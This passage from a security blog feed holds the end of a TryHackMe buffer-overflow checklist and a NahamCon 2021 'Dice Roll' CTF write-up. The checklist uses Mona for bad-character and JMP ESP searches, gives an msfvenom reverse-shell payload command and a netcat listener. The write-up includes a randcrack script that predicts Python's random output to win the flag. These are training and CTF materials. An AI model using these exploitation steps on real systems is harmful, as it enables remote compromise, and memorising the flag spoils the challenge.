    <p><input type="checkbox" unchecked="" /> Step 6 - Use Mona to generate a bad character set, excluding \x00, update exploit.py then run it, noting the ESP register value.</p>

    <p><code class="language-plaintext highlighter-rouge">!mona config -set workingfolder c:\mona\%p</code></p>

    <p><code class="language-plaintext highlighter-rouge">!mona bytearray -b "\x00"</code></p>

    <p><mark>ESP = 0x<input type="text" id="esp" name="esp" value=" " /> <br />(Substitute for YYYYYYYY in code segments below)</mark></p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 7 - Use Mona to find possible bad characters with a comparison between the byte array and ESP.</p>

    <p><code class="language-plaintext highlighter-rouge">!mona compare -f C:\mona\oscp\bytearray.bin -a YYYYYYYY</code></p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 8 - Update the byte array and payload to exclude all possible bad characters, then run the exploit followed by a Mona comparison to find bad characters. Remove identified bad characters (ignoring the second of adjacent bytes that are flagged as bad, as this may not be the case) and repeat the process until all bad characters have been eliminated.</p>

    <p><mark>Bad Character Array = "\x00\ <input type="text" id="badchars" name="badchars" value=" " /><br />(Substitute for "\x00\x??\x??\x??" in code segments below)</mark></p>

    <p><code class="language-plaintext highlighter-rouge">!mona bytearray -b "\x00\x??\x??\x??"</code></p>

    <p><code class="language-plaintext highlighter-rouge">python3 exploit.py</code></p>

    <p><mark>New ESP = 0x<input type="text" id="newesp" name="newesp" value=" " /> <br />(Substitute for ZZZZZZZZ in code segments below)</mark></p>

    <p><code class="language-plaintext highlighter-rouge">!mona compare -f C:\mona\oscp\bytearray.bin -a ZZZZZZZZ</code> (Update the ESP address after each crash)</p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 9 - Find a JMP point using Mona and update the RETN variable in the exploit script accordingly.</p>

    <p><code class="language-plaintext highlighter-rouge">!mona jmp -r esp -cpb "\x00\x??\x??\x??"</code></p>

    <p><mark>Chosen return address = 0x<input type="text" id="retn" name="retn" value=" " /> <br />(Substitute for 0xTHISADDR in code segments below)</mark></p>

    <p><code class="language-plaintext highlighter-rouge">retn = "\xDR\xAD\xIS\xTH"</code> (Little Endian format for 0xTHISADDR)</p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 10 - Generate an MSF reverse shell payload (excluding all bad characters identified) and replace the payload value in exploit.py, along with NOP (\x90) padding of at least 16 bytes.</p>

    <p><mark>Your IP Address = <input type="text" id="ipaddr" name="ipaddr" value="" /> <br />(Substitute for 127.0.0.1 in code segments below)</mark><br /><br />
  <mark>Your Listener Port = <input type="text" id="listener" name="listener" value="" /> <br />(Substitute for 4444 in code segments below)</mark></p>

    <p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x??\x??\??" -f c</code></p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 11 - Open up a Netcat listener and run the exploit for reverse shell.</p>

    <p><code class="language-plaintext highlighter-rouge">nc -nvlp 4444</code></p>
  </li>
</ul>

<p><a href="#toc">Return to Table of Contents</a></p>

<hr />]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;, &quot;resources&quot;]" /><category term="TryHackMe" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Dice Roll</title><link href="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll.html" rel="alternate" type="text/html" title="Dice Roll" /><published>2021-03-14T23:48:00-05:00</published><updated>2021-03-14T23:48:00-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll.html"><![CDATA[<h1></h1>
<h3><font color="FF3030">Challenge Text</font></h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: @JohnHammond#6971

When you have just one source of randomness, it's "a die", but when you can have muliple -- it's 'dice!'

NOTE: You are welcome to "brute force" this challenge if you feel you need to. ;)

Download the file below and press the Start button on the top-right to begin this challenge.
</code></pre></div></div>

<h1></h1>
<h3><font color="FF3030">Solution</font></h3>

<ul>
  <li>Downloading the code, we can see that the program allows us to randomly generate a 32 bit integer that represents a dice roll, reset the random seed (‚Äúshake the dice‚Äù), or try to guess the outcome of the next dice roll.</li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">banner</span> <span class="o">=</span> <span class="s">"""
              _______
   ______    | .   . |</span><span class="se">\\</span><span class="s">
  /     /</span><span class="se">\\</span><span class="s">   |   .   |.</span><span class="se">\\</span><span class="s">
 /  '  /  </span><span class="se">\\</span><span class="s">  | .   . |.'|
/_____/. . </span><span class="se">\\</span><span class="s"> |_______|.'|
</span><span class="se">\\</span><span class="s"> . . </span><span class="se">\\</span><span class="s">    /  </span><span class="se">\\</span><span class="s"> ' .   </span><span class="se">\\</span><span class="s">'|
 </span><span class="se">\\</span><span class="s"> . . </span><span class="se">\\</span><span class="s">  /    </span><span class="se">\\</span><span class="s">____'__</span><span class="se">\\</span><span class="s">|
  </span><span class="se">\\</span><span class="s">_____</span><span class="se">\\</span><span class="s">/

      D I C E   R O L L
"""</span>

<span class="n">menu</span> <span class="o">=</span> <span class="s">"""
0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)
"""</span>

<span class="n">dice_bits</span> <span class="o">=</span> <span class="mi">32</span>
<span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.txt'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">menu</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
                <span class="n">entered</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
        <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"ERROR: Please select a menu option"</span><span class="p">)</span>
                <span class="k">continue</span>

        <span class="k">if</span> <span class="n">entered</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"ERROR: Please select a menu option"</span><span class="p">)</span>
                <span class="k">continue</span>

        <span class="k">if</span> <span class="n">entered</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Our dice are loaded with a whopping 32 bits of randomness!"</span><span class="p">)</span>
                <span class="k">continue</span>

        <span class="k">if</span> <span class="n">entered</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Shaking all the dice..."</span><span class="p">)</span>
                <span class="n">random</span><span class="p">.</span><span class="n">seed</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="n">dice_bits</span><span class="p">))</span>
                <span class="k">continue</span>

        <span class="k">if</span> <span class="n">entered</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Rolling the dice... the sum was:"</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="n">dice_bits</span><span class="p">))</span>
                <span class="k">continue</span>

        <span class="k">if</span> <span class="n">entered</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Guess the dice roll to win a flag! What will the sum total be?"</span><span class="p">)</span>
                <span class="k">try</span><span class="p">:</span>
                        <span class="n">guess</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
                <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
                        <span class="k">print</span><span class="p">(</span><span class="s">"ERROR: Please enter a valid number!"</span><span class="p">)</span>
                        <span class="k">continue</span>

                <span class="n">total</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="n">dice_bits</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">guess</span> <span class="o">==</span> <span class="n">total</span><span class="p">:</span>
                        <span class="k">print</span><span class="p">(</span><span class="s">"HOLY COW! YOU GUESSED IT RIGHT! Congratulations! Here is your flag:"</span><span class="p">)</span>
                        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                        <span class="k">print</span><span class="p">(</span><span class="s">"No, sorry, that was not correct... the sum total was:"</span><span class="p">)</span>
                        <span class="k">print</span><span class="p">(</span><span class="n">total</span><span class="p">)</span>

                <span class="k">continue</span></code></pre></figure>

<ul>
  <li>
    <p>Since seeding is optional and <em>getrandbits</em> (which is a deterministic, pseudo-random generator) is used, we should be able to predict values.  Luckily, there is a tool called <a href="https://pypi.org/project/randcrack/" target="_blank">randcrack</a> available that can use 32-bit <em>getrandbits</em> integer inputs to predict newly generated numbers with high accuracy.  It takes 624 integers for randcrack to be ready to predict new numbers.</p>
  </li>
  <li>
    <p>To that end, we can build a script to interact with the challenge connection, roll the dice via option #2 and feed the results into randcrack.  After this we just use randcrack to guess the next roll with option #3 and get the flag.</p>
  </li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">from</span> <span class="nn">randcrack</span> <span class="kn">import</span> <span class="n">RandCrack</span>

<span class="n">rc</span> <span class="o">=</span> <span class="n">RandCrack</span><span class="p">()</span>

<span class="n">address</span> <span class="o">=</span> <span class="s">'challenge.nahamcon.com'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31699</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="mi">4096</span>
<span class="n">tcpsocket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">tcpsocket</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">address</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

<span class="c1"># Get the initial headers
</span><span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Received:'</span><span class="p">,</span> <span class="n">received_data</span><span class="p">)</span>

<span class="c1"># Check information
</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'0</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Received:'</span><span class="p">,</span> <span class="n">received_data</span><span class="p">)</span>

<span class="c1"># Shake the dice
</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'1</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Received:'</span><span class="p">,</span> <span class="n">received_data</span><span class="p">)</span>

<span class="c1"># Roll the dice enough for RandCrack to be able to work its magic
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">624</span><span class="p">):</span>
        <span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'2</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
        <span class="n">received_data_lines</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>
        <span class="n">received_roll</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">received_data_lines</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="n">rc</span><span class="p">.</span><span class="n">submit</span><span class="p">(</span><span class="n">received_roll</span><span class="p">)</span>
        <span class="c1">#print ('Received Roll Number',i,':', received_roll)
</span>
<span class="c1"># Get a prediction of the next roll from RandCrack
</span><span class="k">try</span><span class="p">:</span>
        <span class="n">roll_prediction</span> <span class="o">=</span> <span class="n">rc</span><span class="p">.</span><span class="n">predict_randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4294967294</span><span class="p">)</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">"Roll Prediction: "</span><span class="p">,</span> <span class="n">roll_prediction</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">'Not enough rolls to predict - change range to 625.'</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="c1"># Try to guess the next roll and output the response
</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'3</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Received:'</span><span class="p">,</span> <span class="n">received_data</span><span class="p">)</span>
<span class="n">roll_prediction_encoded</span> <span class="o">=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">roll_prediction</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">roll_prediction_encoded</span><span class="p">)</span>
<span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Received:'</span><span class="p">,</span> <span class="n">received_data</span><span class="p">)</span>

<span class="n">tcpsocket</span><span class="p">.</span><span class="n">close</span><span class="p">()</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">‚îÄ<span class="o">(</span>shinris3n„âøkodachi<span class="o">)</span>-[~/sec/CTFs/Nahamcon_2021/dice_roll]
‚îî‚îÄ<span class="nv">$ </span>python3 roll_a_lot.py                                                                 
Received: 
              _______
   ______    | <span class="nb">.</span>   <span class="nb">.</span> |<span class="se">\</span>
  /     /<span class="se">\ </span>  |   <span class="nb">.</span>   |.<span class="se">\</span>
 /  <span class="s1">'  /  \  | .   . |.'</span>|
/_____/. <span class="nb">.</span> <span class="se">\ </span>|_______|.<span class="s1">'|
\ . . \    /  \ '</span> <span class="nb">.</span>   <span class="se">\'</span>|
 <span class="se">\ </span><span class="nb">.</span> <span class="nb">.</span> <span class="se">\ </span> /    <span class="se">\_</span>___<span class="s1">'__\|
  \_____\/

      D I C E   R O L L


0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)

&gt; 
Received: Our dice are loaded with a whopping 32 bits of randomness!

0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)

&gt; 
Received: Shaking all the dice...

0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)

&gt; 
Roll Prediction:  131726453
Received: Guess the dice roll to win a flag! What will the sum total be?
&gt; 
Received: HOLY COW! YOU GUESSED IT RIGHT! Congratulations! Here is your flag:
flag{e915b62b2195d76bfddaac0160ed3194}

0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)</span></code></pre></figure>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html"><![CDATA[Challenge Text]]></summary></entry></feed>